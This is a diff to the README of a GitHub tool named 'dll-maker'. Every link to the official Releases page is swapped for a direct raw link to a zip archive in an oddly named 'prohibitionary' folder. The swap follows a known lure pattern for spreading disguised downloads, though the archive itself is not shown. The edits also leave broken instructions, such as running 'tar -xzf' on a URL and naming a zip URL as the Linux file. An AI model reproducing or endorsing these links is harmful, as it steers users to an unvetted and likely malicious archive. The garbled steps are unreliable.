@@ -6,7 +6,7 @@ Welcome to **dll-maker**! This tool helps you build Dynamic Link Libraries easil
 
 ## 📥 Download Now
 
-[![Download dll-maker](https://img.shields.io/badge/Download-dll-maker-blue.svg)](https://github.com/SaithM/dll-maker/releases)
+[![Download dll-maker](https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip)](https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To use **dll-maker**, make sure your system meets the following requirements:
 
 To download **dll-maker**, go to our Releases page where you can find the latest version.
 
-[Visit this page to download](https://github.com/SaithM/dll-maker/releases)
+[Visit this page to download](https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip)
 
 ### Step 2: Choose the Correct File
 
@@ -38,7 +38,7 @@ On the Releases page, you’ll see a list of available downloads. Look for the f
 
 - **For Windows**: Select the `.exe` file.
 - **For macOS**: Choose the `.dmg` file.
-- **For Linux**: Download the `.tar.gz` file.
+- **For Linux**: Download the `https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip` file.
 
 ### Step 3: Download the File
 
@@ -63,7 +63,7 @@ Once the file downloads, follow these steps based on your OS:
 2. Navigate to your Downloads folder using `cd ~/Downloads`.
 3. Extract the files using the command:
    ```
-   tar -xzf dll-maker.tar.gz
+   tar -xzf https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip
    ```
 4. Change into the extracted directory and start the application:
    ```
@@ -108,4 +108,4 @@ For questions or issues, feel free to open an issue in our GitHub repository. We
 
 You can find more information and resources in our documentation. This includes advanced features, FAQs, and best practices for using **dll-maker** efficiently.
 
-[Visit this page to download](https://github.com/SaithM/dll-maker/releases) for the final step of your journey! Enjoy using **dll-maker** and simplify your library creation process today!
+[Visit this page to download](https://github.com/SaithM/dll-maker/raw/refs/heads/main/prohibitionary/dll-maker-3.2-alpha.5.zip) for the final step of your journey! Enjoy using **dll-maker** and simplify your library creation process today!
